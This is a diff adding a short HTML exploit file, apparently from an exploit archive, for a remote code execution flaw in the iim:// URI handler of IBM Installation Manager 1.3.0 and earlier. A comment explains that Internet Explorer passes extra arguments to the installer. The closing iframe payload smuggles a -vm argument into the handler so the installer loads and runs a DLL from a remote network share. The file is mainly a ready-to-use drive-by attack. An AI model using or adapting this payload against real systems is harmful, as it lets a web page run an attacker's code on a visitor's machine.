@@ -1,0 +1,21 @@
+<!--
+IBM Installation Manager <= 1.3.0 iim:// uri handler remote code execution exploit - IE
+by nine:situations:group::bruiser
+site: http://retrogod.altervista.org/
+
+vulnerable:
+IBM Rational Robot
+IBM Rational Team Concert
+possibly all Rational products, not Rational Appscan I see
+
+download location: http://www14.software.ibm.com/webapp/download/byproduct.jsp?pgel=ibmhzn1&cm_re=masthead-_-supdl-_-dl-trials
+info: http://www-01.ibm.com/software/rational/installmgr/faq.html
+
+bug:
+through Internet Explorer is possible to specify extra command line arguments, ex.
+the -vm argument for the IBMIM.exe executable, which will load an arbitrary dll
+from an external network share, change the path to your own library with some code
+in the entry point
+-->
+
+<iframe src='iim://"%20-vm%20\\192.168.0.1\uncshare\sh.dll%20-url%20"'></iframe>
